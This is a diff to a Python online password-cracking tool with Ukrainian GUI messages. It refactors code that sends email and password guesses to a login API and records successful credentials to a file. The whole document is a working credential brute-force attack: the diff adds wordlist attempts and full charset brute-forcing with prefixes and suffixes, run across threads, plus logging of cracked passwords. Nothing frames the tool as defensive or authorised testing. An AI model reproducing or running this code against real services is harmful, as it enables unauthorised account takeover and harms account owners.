@@ -23,7 +23,7 @@ SYSTEM_CHOICES = {
 
 print_lock = threading.Lock()
 found_password = threading.Event()
-start_time = None
+start_time = datetime.now()
 
 def reset_state():
     global found_password, start_time
@@ -38,20 +38,10 @@ def process_password_list(user_email):
                 password = password.strip()
                 if found_password.is_set():
                     return
-                response = requests.post(API_URL, json={'email': user_email, 'password': password},
-                                         headers={'Content-Type': 'application/json'})
-                with print_lock:
-                    print(f"Trying email [{user_email}] with password [{password}] at {datetime.now()}", flush=True)
+                response = send_request(password, user_email)
+
                 if response.status_code == 200:
-                    with print_lock:
-                        print("#######################################################################")
-                        print(f"Password for user [{user_email}] found [{password}]")
-                        print("#######################################################################")
-                        with open(OUTPUT_FILE, "a") as out_f:
-                            now = datetime.now()
-                            elapsed_time = now - start_time
-                            out_f.write(f"{user_email},{password},{start_time},{now},{elapsed_time}\n")
-                    found_password.set()
+                    process_success_code(password, user_email)
                     return
     except FileNotFoundError:
         messagebox.showerror("Помилка", "Файл списку паролів не знайдено!")
@@ -78,6 +68,51 @@ def run_in_threads(user_email, user_choices, password_lengths, prefix, suffix, c
         ]
         for future in futures:
             future.result()
+
+def process_passwords(user_email, charset, password_lengths, prefix="", suffix=""):
+    if not charset:
+        with print_lock:
+            print("Invalid character set provided.", flush=True)
+        return
+
+    for length in password_lengths:
+        total_length = length - (len(prefix) + len(suffix))
+        if total_length <= 0:
+            with print_lock:
+                print("The total password length is smaller than the combined prefix and suffix length.", flush=True)
+            return
+
+        for password in itertools.product(charset, repeat=total_length):
+            if found_password.is_set():
+                return
+
+            password_str = prefix + ''.join(password) + suffix
+            response = send_request(password_str, user_email)
+
+            if response.status_code == 200:
+                process_success_code(password_str, user_email)
+                return
+
+
+def process_success_code(password_str, user_email):
+    with print_lock:
+        print("#######################################################################")
+        print(f"Password for user [{user_email}] found [{password_str}]")
+        print("#######################################################################")
+        with open(OUTPUT_FILE, "a") as f:
+            now = datetime.now()
+            elapsed_time = now - start_time
+            f.write(f"{user_email},{password_str},{start_time},{now},{elapsed_time}\n")
+    found_password.set()
+
+
+def send_request(password_str, user_email):
+    response = requests.post(API_URL, json={'email': user_email, 'password': password_str},
+                             headers={'Content-Type': 'application/json'})
+    with print_lock:
+        print(f"Trying email [{user_email}] with password [{password_str}] at {datetime.now()}", flush=True)
+    return response
+
 
 def start_cracking():
     email = email_entry.get()
